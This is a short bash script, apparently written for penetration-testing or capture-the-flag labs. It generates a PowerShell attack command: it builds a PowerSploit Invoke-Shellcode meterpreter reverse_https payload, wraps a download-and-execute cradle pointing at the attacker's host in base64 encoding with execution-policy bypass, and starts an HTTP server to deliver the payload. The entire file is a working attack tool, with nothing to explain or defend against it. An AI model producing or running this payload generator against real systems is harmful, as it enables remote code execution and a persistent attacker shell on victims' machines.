#!/bin/bash

# meterpreter ip & port
lhost=10.10.14.xx
lport=443

echo " * Writing Payload"
cat /usr/share/powersploit/CodeExecution/Invoke-Shellcode.ps1 > payload
echo "Invoke-Shellcode -Payload windows/meterpreter/reverse_https -Lhost $lhost -Lport $lport -Force" >> payload

echo " * Prepping Command"
scriptblock="iex (New-Object Net.WebClient).DownloadString('http://$lhost:8000/payload')"
echo $scriptblock

echo
echo " * Encoding command"
encode="`echo $scriptblock | iconv --to-code UTF-16LE | base64 -w 0`"
echo $encode

command="cmd.exe /c powershell.exe -Exec ByPass -Nol -Enc $encode"
echo
echo " * Final command"
echo $command

echo
echo " * Starting HTTP Server to serve payload"
python -m SimpleHTTPServer
